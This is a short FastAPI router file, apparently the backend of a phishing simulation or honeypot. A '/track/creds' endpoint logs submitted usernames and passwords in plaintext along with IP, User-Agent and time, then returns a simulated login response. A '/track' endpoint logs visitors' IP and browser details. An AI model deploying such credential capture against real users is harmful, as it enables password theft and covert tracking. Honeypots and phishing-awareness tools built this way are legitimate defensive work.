from fastapi import APIRouter, Request, Form
from utils import log_request
from datetime import datetime

router = APIRouter()

@router.post("/track")
async def track(request: Request):
    data = await request.json()
    client_ip = request.client.host
    ua = request.headers.get("User-Agent", "Unknown")
    data["ip"] = client_ip
    data["user_agent"] = ua
    data["time"] = datetime.utcnow().isoformat()
    log_request(request, f"[TRACK] {data}")
    return {"status": "logged"}

@router.post("/track/creds")
async def capture_creds(username: str = Form(...), password: str = Form(...), request: Request = None):
    ip = request.client.host
    ua = request.headers.get("User-Agent", "Unknown")
    time = datetime.utcnow().isoformat()
    log_request(request, f"[LOGIN ATTEMPT] {username}:{password} | IP={ip} | UA={ua} | Time={time}")
    return {"user": username if username == "admin" and password == "admin123" else None, "message": "Connexion simulée"}
